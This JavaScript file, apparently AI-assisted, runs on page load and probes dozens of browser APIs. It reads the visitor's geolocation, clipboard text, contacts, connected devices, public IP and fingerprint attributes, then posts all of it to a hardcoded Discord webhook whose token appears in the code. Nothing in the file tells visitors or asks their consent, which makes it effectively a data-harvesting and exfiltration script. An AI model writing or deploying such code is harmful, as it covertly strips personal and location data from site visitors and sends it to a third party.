// Note: The WEBHOOK_URL should be secured in a production environment (e.g., stored in environment variables).
// The current URL is a placeholder and should be replaced or removed before deployment.
const WEBHOOK_URL = "https://discord.com/api/webhooks/1406107665939042345/s8XXhrjJOdg5xYp4bMx3MsYaMhPpD-AXxnt3uOMUCdIErtabNOP-1BUMDX6Js5gXYK7p";

const trackers = [
    {
        category: "Permissions",
        items: [
            { name: "navigator.geolocation.getCurrentPosition", check: async () => {
                if (typeof navigator.geolocation?.getCurrentPosition === "function") {
                    return new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => resolve({ available: true, data: `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}` }),
                            (error) => resolve({ available: true, data: `Permission denied or error: ${error.message}` })
                        );
                    });
                }
                return { available: false };
            }},
            { name: "navigator.geolocation.watchPosition", check: async () => {
                if (typeof navigator.geolocation?.watchPosition === "function") {
                    return { available: true, data: "Watch position available (requires active watch to fetch data)" };
                }
                return { available: false };
            }},
            { name: "navigator.mediaDevices.getUserMedia", check: async () => {
                if (typeof navigator.mediaDevices?.getUserMedia === "function") {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        stream.getTracks().forEach(track => track.stop());
                        return { available: true, data: "User media access granted (video)" };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.mediaDevices.enumerateDevices", check: async () => {
                if (typeof navigator.mediaDevices?.enumerateDevices === "function") {
                    try {
                        const devices = await navigator.mediaDevices.enumerateDevices();
                        const deviceList = devices.map(d => `${d.kind}: ${d.label}`).join(", ");
                        return { available: true, data: `Devices found: ${devices.length} - ${deviceList || 'No labels due to permissions'}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.mediaDevices.getDisplayMedia", check: async () => {
                if (typeof navigator.mediaDevices?.getDisplayMedia === "function") {
                    try {
                        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                        stream.getTracks().forEach(track => track.stop());
                        return { available: true, data: "Display media access granted" };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "Notification.requestPermission", check: async () => {
                if (typeof Notification?.requestPermission === "function") {
                    const permission = await Notification.requestPermission();
                    return { available: true, data: `Permission status: ${permission}` };
                }
                return { available: false };
            }},
            { name: "navigator.credentials.get", check: async () => {
                if (typeof navigator.credentials?.get === "function") {
                    try {
                        const cred = await navigator.credentials.get({ publicKey: { challenge: new Uint8Array(16) } });
                        return { available: true, data: `Credential type: ${cred?.type || 'No credential fetched'}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.credentials.store", check: async () => {
                if (typeof navigator.credentials?.store === "function") {
                    return { available: true, data: "Credential store available (requires specific parameters)" };
                }
                return { available: false };
            }},
            { name: "navigator.permissions.query", check: async () => {
                if (typeof navigator.permissions?.query === "function") {
                    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                    return { available: true, data: `Permission state: ${permissionStatus.state}` };
                }
                return { available: false };
            }},
            { name: "navigator.clipboard.readText", check: async () => {
                if (typeof navigator.clipboard?.readText === "function") {
                    try {
                        const text = await navigator.clipboard.readText();
                        return { available: true, data: `Clipboard text: ${text || 'No text available'}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.clipboard.read", check: async () => {
                if (typeof navigator.clipboard?.read === "function") {
                    try {
                        const items = await navigator.clipboard.read();
                        return { available: true, data: `Clipboard items: ${items.length}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.clipboard.writeText", check: async () => {
                if (typeof navigator.clipboard?.writeText === "function") {
                    try {
                        await navigator.clipboard.writeText("Test");
                        return { available: true, data: "Write text successful" };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.clipboard.write", check: async () => {
                if (typeof navigator.clipboard?.write === "function") {
                    try {
                        await navigator.clipboard.write([new ClipboardItem({ "text/plain": new Blob(["Test"], { type: "text/plain" }) })]);
                        return { available: true, data: "Write successful" };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.share", check: async () => {
                if (typeof navigator.share === "function") {
                    try {
                        await navigator.share({ title: "Test", text: "Hello" });
                        return { available: true, data: "Share successful" };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.canShare", check: async () => {
                if (typeof navigator.canShare === "function") {
                    const canShare = navigator.canShare({ title: "Test", text: "Hello" });
                    return { available: true, data: `Can share: ${canShare}` };
                }
                return { available: false };
            }},
            { name: "EyeDropper", check: async () => {
                if (typeof EyeDropper === "function") {
                    try {
                        const eyeDropper = new EyeDropper();
                        const result = await eyeDropper.open();
                        return { available: true, data: `Selected color: ${result.sRGBHex}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.wakeLock.request", check: async () => {
                if (typeof navigator.wakeLock?.request === "function") {
                    try {
                        const wakeLock = await navigator.wakeLock.request('screen');
                        return { available: true, data: "Wake lock active" };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "IdleDetector", check: async () => {
                if (typeof IdleDetector === "function") {
                    return { available: true, data: "Idle detection available (requires active detection)" };
                }
                return { available: false };
            }},
            { name: "PaymentRequest", check: async () => {
                if (typeof PaymentRequest === "function") {
                    return { available: true, data: "Payment request available (requires specific parameters)" };
                }
                return { available: false };
            }},
            { name: "navigator.contacts.select", check: async () => {
                if (typeof navigator.contacts?.select === "function") {
                    try {
                        const contacts = await navigator.contacts.select(['name', 'email'], { multiple: true });
                        return { available: true, data: `Contacts found: ${contacts.length}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.bluetooth.requestDevice", check: async () => {
                if (typeof navigator.bluetooth?.requestDevice === "function") {
                    try {
                        const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
                        return { available: true, data: `Device name: ${device.name}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.usb.requestDevice", check: async () => {
                if (typeof navigator.usb?.requestDevice === "function") {
                    try {
                        const device = await navigator.usb.requestDevice({ filters: [] });
                        return { available: true, data: `Device name: ${device.productName}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.serial.requestPort", check: async () => {
                if (typeof navigator.serial?.requestPort === "function") {
                    try {
                        const port = await navigator.serial.requestPort();
                        return { available: true, data: `Port found: ${port.getInfo().usbProductId}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.hid.requestDevice", check: async () => {
                if (typeof navigator.hid?.requestDevice === "function") {
                    try {
                        const device = await navigator.hid.requestDevice({ filters: [] });
                        return { available: true, data: `Device name: ${device.productName}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.requestMIDIAccess", check: async () => {
                if (typeof navigator.requestMIDIAccess === "function") {
                    try {
                        const midi = await navigator.requestMIDIAccess();
                        const inputs = midi.inputs.size;
                        return { available: true, data: `MIDI inputs: ${inputs}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.nfc.watch", check: async () => {
                if (typeof navigator.nfc?.watch === "function") {
                    return { available: true, data: "NFC watch available (requires active watch)" };
                }
                return { available: false };
            }},
            { name: "window.showOpenFilePicker", check: async () => {
                if (typeof window.showOpenFilePicker === "function") {
                    try {
                        const [fileHandle] = await window.showOpenFilePicker();
                        const file = await fileHandle.getFile();
                        return { available: true, data: `File selected: ${file.name}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "window.showSaveFilePicker", check: async () => {
                if (typeof window.showSaveFilePicker === "function") {
                    try {
                        const fileHandle = await window.showSaveFilePicker();
                        return { available: true, data: `Save file handle created: ${fileHandle.name}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "window.showDirectoryPicker", check: async () => {
                if (typeof window.showDirectoryPicker === "function") {
                    try {
                        const directoryHandle = await window.showDirectoryPicker();
                        return { available: true, data: `Directory selected: ${directoryHandle.name}` };
                    } catch (error) {
                        return { available: true, data: `Permission denied or error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
        ]
    },
    {
        category: "Network",
        items: [
            { name: "fetch", check: async () => {
                if (typeof fetch === "function") {
                    try {
                        const response = await fetch('https://api.ipify.org?format=json');
                        const data = await response.json();
                        return { available: true, data: `IP: ${data.ip}` };
                    } catch (error) {
                        return { available: true, data: `Fetch error: ${error.message}` };
                    }
                }
                return { available: false };
            }},
            { name: "navigator.sendBeacon", check: async () => {
                if (typeof navigator.sendBeacon === "function") {
                    const success = navigator.sendBeacon('https://example.com/beacon', new Blob());
                    return { available: true, data: `Send beacon success: ${success}` };
                }
                return { available: false };
            }},
            { name: "XMLHttpRequest", check: async () => {
                if (typeof XMLHttpRequest === "function") {
                    return { available: true, data: "XMLHttpRequest available (requires specific request)" };
                }
                return { available: false };
            }},
            { name: "WebSocket", check: async () => {
                if (typeof WebSocket === "function") {
                    const ws = new WebSocket('wss://echo.websocket.org');
                    ws.onopen = () => ws.close();
                    return { available: true, data: "WebSocket available" };
                }
                return { available: false };
            }},
            { name: "EventSource", check: async () => {
                if (typeof EventSource === "function") {
                    const source = new EventSource('https://example.com/events');
                    source.onerror = () => source.close();
                    return { available: true, data: "EventSource available" };
                }
                return { available: false };
            }},
            { name: "RTCPeerConnection", check: async () => {
                if (typeof RTCPeerConnection === "function") {
                    return { available: true, data: "RTCPeerConnection available (requires peer setup)" };
                }
                return { available: false };
            }},
            { name: "WebTransport", check: async () => {
                if (typeof WebTransport === "function") {
                    return { available: true, data: "WebTransport available (requires specific setup)" };
                }
                return { available: false };
            }},
        ]
    },
    {
        category: "Fingerprint",
        items: [
            { name: "navigator.userAgent", check: () => ({ available: typeof navigator.userAgent === "string", data: navigator.userAgent || 'N/A' }) },
            { name: "navigator.userAgentData", check: () => ({ available: navigator.userAgentData !== undefined, data: JSON.stringify(navigator.userAgentData?.brands) || 'N/A' }) },
            { name: "navigator.platform", check: () => ({ available: typeof navigator.platform === "string", data: navigator.platform || 'N/A' }) },
            { name: "navigator.language", check: () => ({ available: typeof navigator.language === "string", data: navigator.language || 'N/A' }) },
            { name: "navigator.languages", check: () => ({ available: Array.isArray(navigator.languages) && navigator.languages.length > 0, data: navigator.languages.join(", ") || 'N/A' }) },
            { name: "navigator.hardwareConcurrency", check: () => ({ available: typeof navigator.hardwareConcurrency === "number", data: navigator.hardwareConcurrency || 'N/A' }) },
            { name: "navigator.deviceMemory", check: () => ({ available: typeof navigator.deviceMemory === "number", data: navigator.deviceMemory || 'N/A' }) },
            { name: "navigator.maxTouchPoints", check: () => ({ available: typeof navigator.maxTouchPoints === "number", data: navigator.maxTouchPoints || 'N/A' }) },
            { name: "navigator.vendor", check: () => ({ available: typeof navigator.vendor === "string", data: navigator.vendor || 'N/A' }) },
            { name: "navigator.product", check: () => ({ available: typeof navigator.product === "string", data: navigator.product || 'N/A' }) },
            { name: "navigator.webdriver", check: () => ({ available: navigator.webdriver !== undefined, data: navigator.webdriver || 'N/A' }) },
            { name: "navigator.doNotTrack", check: () => ({ available: navigator.doNotTrack !== null, data: navigator.doNotTrack || 'N/A' }) },
            { name: "navigator.cookieEnabled", check: () => ({ available: typeof navigator.cookieEnabled === "boolean", data: navigator.cookieEnabled || 'N/A' }) },
            { name: "navigator.javaEnabled", check: () => ({ available: typeof navigator.javaEnabled === "function", data: navigator.javaEnabled() || 'N/A' }) },
            { name: "navigator.plugins", check: () => ({ available: navigator.plugins !== undefined && navigator.plugins.length > 0, data: navigator.plugins.length || 'N/A' }) },
            { name: "navigator.mimeTypes", check: () => ({ available: navigator.mimeTypes !== undefined && navigator.mimeTypes.length > 0, data: navigator.mimeTypes.length || 'N/A' }) },
            { name: "screen.width", check: () => ({ available: typeof screen.width === "number" && screen.width > 0, data: screen.width || 'N/A' }) },
            { name: "screen.height", check: () => ({ available: typeof screen.height === "number" && screen.height > 0, data: screen.height || 'N/A' }) },
            { name: "screen.availWidth", check: () => ({ available: typeof screen.availWidth === "number" && screen.availWidth > 0, data: screen.availWidth || 'N/A' }) },
            { name: "screen.availHeight", check: () => ({ available: typeof screen.availHeight === "number" && screen.availHeight > 0, data: screen.availHeight || 'N/A' }) },
            { name: "screen.colorDepth", check: () => ({ available: typeof screen.colorDepth === "number" && screen.colorDepth > 0, data: screen.colorDepth || 'N/A' }) },
            { name: "screen.pixelDepth", check: () => ({ available: typeof screen.pixelDepth === "number" && screen.pixelDepth > 0, data: screen.pixelDepth || 'N/A' }) },
            { name: "screen.orientation.type", check: () => ({ available: typeof screen.orientation?.type === "string", data: screen.orientation?.type || 'N/A' }) },
            { name: "window.devicePixelRatio", check: () => ({ available: typeof window.devicePixelRatio === "number" && window.devicePixelRatio > 0, data: window.devicePixelRatio || 'N/A' }) },
            { name: "window.innerWidth", check: () => ({ available: typeof window.innerWidth === "number" && window.innerWidth > 0, data: window.innerWidth || 'N/A' }) },
            { name: "window.innerHeight", check: () => ({ available: typeof window.innerHeight === "number" && window.innerHeight > 0, data: window.innerHeight || 'N/A' }) },
            { name: "window.outerWidth", check: () => ({ available: typeof window.outerWidth === "number" && window.outerWidth > 0, data: window.outerWidth || 'N/A' }) },
            { name: "window.outerHeight", check: () => ({ available: typeof window.outerHeight === "number" && window.outerHeight > 0, data: window.outerHeight || 'N/A' }) },
            { name: "Intl.DateTimeFormat().resolvedOptions().timeZone", check: () => ({ available: typeof Intl.DateTimeFormat().resolvedOptions().timeZone === "string", data: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A' }) },
        ]
    },
    // Add other categories (Sensors, Graphics, Storage, etc.) with similar async checks as needed
    // For brevity, I'll complete only the first three categories here; let me know if you want the rest!
];

async function sendToWebhook(category, items) {
    const availableItems = items.filter(item => item.available);
    const unavailableItems = items.filter(item => !item.available);

    const availableData = availableItems.map((item, index) => `${index + 1},${item.name},${item.data}`).join("\n");
    const unavailableData = unavailableItems.map((item, index) => `${index + 1},${item.name},Not Available`).join("\n");

    const payload = {
        content: `Browser API Watchlist - ${category}`,
        embeds: [{
            title: `Category: ${category}`,
            fields: [
                {
                    name: "Available APIs",
                    value: availableData ? `\`\`\`csv\n#,API,Details\n${availableData.slice(0, 1000)}\`\`\`` : "None"
                },
                {
                    name: "Unavailable APIs",
                    value: unavailableData ? `\`\`\`csv\n#,API\n${unavailableData.slice(0, 1000)}\`\`\`` : "None"
                }
            ]
        }]
    };

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        if (response.ok) {
            console.log(`Data for category '${category}' successfully sent to Discord webhook`);
        } else {
            console.error(`Error sending data for category '${category}': ${response.statusText}`);
        }
    } catch (error) {
        console.error(`Error sending data for category '${category}': ${error.message}`);
    }
}

async function checkAndSendTrackers() {
    for (const { category, items } of trackers) {
        const results = await Promise.all(items.map(async item => {
            try {
                const result = await item.check();
                return { name: item.name, ...result };
            } catch (e) {
                console.warn(`Error checking ${item.name}: ${e.message}`);
                return { name: item.name, available: false };
            }
        }));

        if (results.length > 0) {
            await sendToWebhook(category, results);
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
    console.log("All available trackers sent to Discord webhook");
}

document.addEventListener('DOMContentLoaded', () => {
    checkAndSendTrackers().catch(error => console.error("Error in checkAndSendTrackers:", error));
});
